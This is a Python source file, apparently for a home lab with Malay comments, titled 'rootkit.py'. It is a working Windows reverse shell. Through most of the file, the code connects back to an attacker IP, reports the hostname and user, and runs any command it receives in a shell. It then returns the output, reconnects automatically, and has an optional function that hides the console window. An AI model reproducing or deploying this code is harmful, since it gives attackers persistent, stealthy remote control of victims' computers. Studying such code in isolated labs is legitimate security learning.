#!/usr/bin/env python3
# rootkit.py - Victim side (Windows)
# Reverse shell - connects back to attacker

import socket
import subprocess
import os
import sys
import time

# ===== KONFIGURASI =====
# !!! IMPORTANT: Tukar IP ini kepada IP Ubuntu kau !!!
# Cara check IP Ubuntu: jalankan 'ip addr' dalam terminal Ubuntu
# 
# Jika guna BRIDGED mode: IP macam 192.168.1.100
# Jika guna NAT with port forwarding: guna 127.0.0.1
ATTACKER_IP = "192.168.1.136"  # <-- GANTI DENGAN IP UBUNTU KAU
PORT = 5000
# =======================

def hide_window():
    """Hide console window (Windows specific)"""
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def execute_command(command):
    """Execute system command and return output"""
    try:
        # Handle 'cd' command separately
        if command.lower().startswith("cd "):
            try:
                path = command[3:].strip()
                os.chdir(path)
                return f"[+] Directory changed to: {os.getcwd()}\n"
            except Exception as e:
                return f"[-] Error: {e}\n"
        
        # Execute other commands
        output = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True,
            timeout=30
        )
        
        result = output.stdout + output.stderr
        if result == "":
            result = "[+] Command executed successfully (no output)\n"
        
        return result
        
    except subprocess.TimeoutExpired:
        return "[-] Command timeout (30 seconds)\n"
    except Exception as e:
        return f"[-] Error: {e}\n"

def connect_to_attacker():
    """Main loop - connect and maintain connection"""
    while True:
        try:
            # Create socket
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to attacker
            print(f"[*] Connecting to {ATTACKER_IP}:{PORT}...")
            client.connect((ATTACKER_IP, PORT))
            print(f"[+] Connected to attacker!")
            
            # Send initial system info
            hostname = socket.gethostname()
            username = os.getlogin() if sys.platform == "win32" else os.getenv("USER")
            client.send(f"\n[+] Rootkit active on {hostname} as {username}\n".encode())
            
            # Command handling loop
            while True:
                # Receive command from attacker
                command = client.recv(1024).decode()
                
                if not command:
                    break
                    
                if command.lower() == 'exit':
                    client.send(b"Connection closed\n")
                    break
                
                # Execute command
                output = execute_command(command)
                
                # Send output back to attacker
                client.send(output.encode())
                
        except socket.error as e:
            print(f"[!] Connection error: {e}")
            print(f"[*] Reconnecting in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)
        finally:
            try:
                client.close()
            except:
                pass

if __name__ == "__main__":
    # Optional: Hide window (uncomment if want stealth)
    # hide_window()
    
    print("=" * 50)
    print("   ROOTKIT - REVERSE SHELL")
    print(f"   Target: {ATTACKER_IP}:{PORT}")
    print("   Press Ctrl+C to stop")
    print("=" * 50)
    
    try:
        connect_to_attacker()
    except KeyboardInterrupt:
        print("\n[!] Rootkit stopped by user.")
        sys.exit(0)
